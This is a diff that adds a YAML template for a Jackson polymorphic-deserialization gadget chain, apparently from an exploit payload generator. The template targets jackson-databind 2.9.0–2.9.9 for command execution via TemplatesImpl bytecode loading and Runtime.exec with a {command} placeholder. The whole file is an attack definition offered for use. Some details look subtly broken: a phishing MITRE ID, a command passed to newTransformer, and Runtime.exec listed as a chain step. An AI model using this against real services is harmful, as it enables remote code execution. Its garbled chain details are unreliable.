@@ -1,0 +1,26 @@
+name: "JacksonTemplatesImpl"
+category: "jackson"
+description: "Jackson TemplatesImpl gadget chain via polymorphic deserialization"
+jdk_version: "all"
+dependencies:
+  - name: "jackson-databind"
+    version: "2.9.0-2.9.9"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/FasterXML/jackson-databind/issues"
+steps:
+  - class_name: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+    method_name: "setBytecodes"
+    parameters:
+      - "{bytecode}"
+  - class_name: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+    method_name: "newTransformer"
+    parameters:
+      - "{command}"
+  - class_name: "java.lang.Runtime"
+    method_name: "exec"
+    parameters:
+      - "{command}"
